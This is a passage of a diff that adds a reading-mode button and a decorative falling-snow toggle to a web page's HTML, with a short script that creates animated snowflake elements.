+            <path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"></path>
+        </svg>
+    </button>
+    
+    <button id="toggle-snow" title="Snow">
+        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <polygon points="12 2 15 8 22 9 17 14 18 21 12 17 6 21 7 14 2 9 9 8 12 2"></polygon>
+        </svg>
+    </button>
+</div>
+
+<div id="snow-wrap" style="display: none;"></div>
+
+<script>
+    
+    document.addEventListener("DOMContentLoaded", function() {
+        
+        
+        const readingBtn = document.getElementById('toggle-reading');
+        if (readingBtn) {
+            readingBtn.addEventListener('click', () => {
+                document.body.classList.toggle('reading-mode');
+            });
+        }
+
+        
+        const snowBtn = document.getElementById('toggle-snow');
+        const snowWrap = document.getElementById('snow-wrap');
+        let snowActive = false;
+
+        if (snowBtn && snowWrap) {
+            snowBtn.addEventListener('click', () => {
+                snowActive = !snowActive;
+                snowWrap.style.display = snowActive ? 'block' : 'none';
+                
+                
+                if(snowActive && snowWrap.innerHTML === '') {
+                    for(let i = 0; i < 60; i++) {
+                        let flake = document.createElement('div');
+                        flake.className = 'snowflake';
+                        flake.innerHTML = '❅';
+                        
+                        
+                        flake.style.left = Math.random() * 100 + 'vw';
+                        
+                        flake.style.animationDuration = (Math.random() * 4 + 4) + 's'; 
+                        
+                        flake.style.animationDelay = (Math.random() * 5) + 's';
+                        
+                        flake.style.opacity = Math.random() * 0.8 + 0.2;
+                        flake.style.fontSize = (Math.random() * 12 + 10) + 'px';
+                        
+                        snowWrap.appendChild(flake);
+                    }
+                }
+            });
+        }
+    });
+</script>
+
+    </body>
+</html>
